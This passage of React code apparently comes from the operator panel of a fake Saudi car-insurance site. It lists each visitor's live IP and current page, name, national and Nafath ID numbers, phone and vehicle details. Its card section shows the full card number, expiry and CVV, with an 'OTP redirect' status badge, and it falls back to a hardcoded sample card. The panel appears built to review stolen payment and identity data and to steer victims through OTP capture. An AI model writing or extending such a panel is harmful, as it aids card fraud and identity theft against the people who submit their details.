                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2" /></svg>
                    <span style={{ color: "#9ca3af", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.ip}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", flexShrink: 0 }}>
                    <span style={{ fontSize: "10px", padding: "2px 6px", background: "#dcfce7", color: "#166534", borderRadius: 4, border: "1px solid #86efac", fontWeight: 600 }}>
                      {liveSummary.currentPage}
                    </span>
                  </div>
                </div>
              </div>

              {/* Client Details Panel */}
              <div
                style={{
                  background: "#f8fafc",
                  border: "1px solid #e5e7eb",
                  borderRadius: 0,
                  padding: 0,
                  marginTop: 0,
                  width: "100%",
                  height: "calc(100vh - 54px - 120px)",
                  minHeight: 420,
                  overflowY: "auto",
                  overflowX: "hidden",
                  boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8)",
                  display: "flex",
                  flexDirection: "column",
                  gap: 12,
                }}
              >
                {renderCustomerEntrySummary()}
                {renderActionButtons()}
                <div style={{ display: "flex", flexDirection: "column", gap: 12, paddingBottom: 16 }}>
                  {/* Basic Info */}
                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
                    <div style={{ marginBottom: 8 }}>
                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
                      </div>
                      <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>معلومات أساسية</h3>
                    </div>
                    <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                        {[
                          { label: "الاسم:", value: selectedRequest.customer || selectedRequest.raw?.ownerName || selectedRequest.raw?.name },
                          { label: "رقم الهوية:", value: selectedRequest.raw?.identityNumber || selectedRequest.raw?.buyerIdNumber || selectedRequest.raw?.phoneIdNumber || selectedRequest.raw?.nafadIdNumber },
                          { label: "رقم الهاتف:", value: selectedRequest.raw?.phoneNumber || selectedRequest.raw?.mobileNumber },
                          { label: "نوع الوثيقة:", value: selectedRequest.raw?.documentType || selectedRequest.raw?.documentTypeName },
                          { label: "الرقم التسلسلي:", value: selectedRequest.raw?.serialNumber || selectedRequest.raw?.sequenceNumber },
                          { label: "نوع التأمين:", value: selectedRequest.raw?.insuranceType || selectedRequest.raw?.coverageType || selectedRequest.raw?.policyType || "تأمين جديد" },
                        ].map(
                          (item) =>
                            item.value && (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                                <span style={{ fontWeight: 600, color: "#6b7280" }}>{item.label}</span>
                                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{item.value}</span>
                              </div>
                            )
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Insurance Info */}
                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
                    <div style={{ marginBottom: 8 }}>
                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
                      </div>
                      <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>تفاصيل التأمين</h3>
                    </div>
                    <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                        {[
                          { label: "نوع التغطية:", value: selectedRequest.raw?.coverageType || selectedRequest.raw?.insuranceCoverage },
                          { label: "موديل المركبة:", value: selectedRequest.raw?.vehicleModel || selectedRequest.raw?.carModel || selectedRequest.raw?.vehicleType },
                          { label: "قيمة المركبة:", value: selectedRequest.raw?.vehicleValue || selectedRequest.raw?.carValue || selectedRequest.raw?.price },
                          { label: "سنة الصنع:", value: selectedRequest.raw?.manufacturingYear || selectedRequest.raw?.vehicleYear },
                          { label: "استخدام المركبة:", value: selectedRequest.raw?.vehicleUsage || selectedRequest.raw?.usage },
                          { label: "موقع الإصلاح:", value: selectedRequest.raw?.repairLocation || selectedRequest.raw?.repairShop },
                        ].map(
                          (item) =>
                            item.value && (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                                <span style={{ fontWeight: 600, color: "#6b7280" }}>{item.label}</span>
                                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{item.value}</span>
                              </div>
                            )
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Offer Info */}
                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
                    <div style={{ marginBottom: 8 }}>
                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
                      </div>
                      <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>العرض المختار</h3>
                    </div>
                    <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                        {[
                          { label: "الشركة:", value: selectedRequest.raw?.companyName || selectedRequest.raw?.company || selectedRequest.raw?.offerCompany || selectedRequest.raw?.selectedCompany },
                          { label: "السعر الأصلي:", value: selectedRequest.raw?.originalPrice || selectedRequest.raw?.price || selectedRequest.raw?.offerPrice },
                          { label: "الخصم:", value: selectedRequest.raw?.discount || selectedRequest.raw?.offerDiscount },
                          { label: "السعر النهائي:", value: selectedRequest.raw?.finalPrice || selectedRequest.raw?.totalPrice || selectedRequest.raw?.offerFinalPrice },
                          { label: "المميزات المختارة:", value: selectedRequest.raw?.features || selectedRequest.raw?.selectedFeatures || "لا يوجد" },
                        ].map(
                          (item) =>
                            item.value && (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                                <span style={{ fontWeight: 600, color: "#6b7280" }}>{item.label}</span>
                                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{item.value}</span>
                              </div>
                            )
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Card Details */}
                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
                    <div style={{ marginBottom: 8 }}>
                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
                      </div>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                        <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827" }}>معلومات البطاقة</h3>
                        <span style={{ padding: "2px 8px", borderRadius: 6, fontSize: "0.75rem", fontWeight: 700, border: "1px solid #93c5fd", background: "#dbeafe", color: "#1d4ed8" }}>🔑 تحول OTP</span>
                      </div>
                    </div>
                    <div style={{ position: "relative", borderRadius: 16, overflow: "hidden", marginBottom: 8, boxShadow: "0 4px 12px rgba(0,0,0,0.12)", background: "linear-gradient(135deg, #f0f4f8 0%, #d8e4f0 100%)", border: "1.5px solid #c0ccd8", minHeight: 170, padding: "16px 18px" }}>
                      <div style={{ position: "absolute", inset: 0, pointerEvents: "none", opacity: 0.06 }}>
                        <div style={{ position: "absolute", top: "-30%", right: "-15%", width: "55%", height: "100%", borderRadius: "50%", background: "#374151" }} />
                        <div style={{ position: "absolute", bottom: "-30%", left: "-10%", width: "45%", height: "80%", borderRadius: "50%", background: "#374151" }} />
                      </div>
                      <div style={{ position: "relative", height: "100%", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                        <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between" }}>
                          <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                            <span style={{ fontSize: "11px", fontWeight: 700, color: "#374151" }}>Mastercard</span>
                            <span style={{ fontSize: "9px", color: "#6b7280", fontWeight: 600, letterSpacing: "0.05em", textTransform: "uppercase" }}>Mastercard</span>
                          </div>
                          <div style={{ border: "1.5px solid #374151", borderRadius: 6, padding: "2px 8px", fontSize: "11px", fontWeight: 700, color: "#374151", letterSpacing: "0.05em" }}>SAR</div>
                        </div>
                        <div style={{ fontFamily: '"Courier New", "Lucida Console", monospace', fontSize: "18px", fontWeight: 700, letterSpacing: "0.15em", color: "#1f2937", direction: "ltr", textAlign: "left", margin: "4px 0" }}>
                          {String(selectedRequest.raw?.cardNumber || "5416 8420 0125 0739").replace(/(.{4})/g, "$1 ").trim()}
                        </div>
                        <div style={{ display: "flex", alignItems: "flex-end", justifyContent: "space-between" }}>
                          <div style={{ display: "flex", flexDirection: "column", gap: 2 }}>
                            <span style={{ fontSize: "11px", fontWeight: 700, color: "#1f2937", letterSpacing: "0.05em", textTransform: "uppercase" }}>{selectedRequest.raw?.cardOwner || "HVFG"}</span>
                            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                              <div>
                                <span style={{ fontSize: "8px", color: "#6b7280", letterSpacing: "0.05em" }}>EXPIRES</span>
                                <div style={{ fontSize: "12px", fontWeight: 700, color: "#1f2937", direction: "ltr" }}>{selectedRequest.raw?.cardExpiry || "03/29"}</div>
                              </div>
                              <div>
                                <span style={{ fontSize: "8px", color: "#6b7280", letterSpacing: "0.05em" }}>CVV</span>
                                <div style={{ fontSize: "12px", fontWeight: 700, color: "#1f2937" }}>{selectedRequest.raw?.cvv || "000"}</div>
                              </div>
                            </div>
                          </div>
                          <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 2 }}>
                            <div>
                              <svg viewBox="0 0 44 28" style={{ height: 28, width: "auto" }}>
                                <circle cx="15" cy="14" r="13" fill="#eb001b" opacity="0.9" />
                                <circle cx="29" cy="14" r="13" fill="#f79e1b" opacity="0.9" />
                                <path d="M22 3.5a13 13 0 0 1 0 21A13 13 0 0 1 22 3.5z" fill="#ff5f00" opacity="0.85" />
                              </svg>
                            </div>
                            <span style={{ fontSize: "8px", color: "#6b7280" }}>⭐ أحدث</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
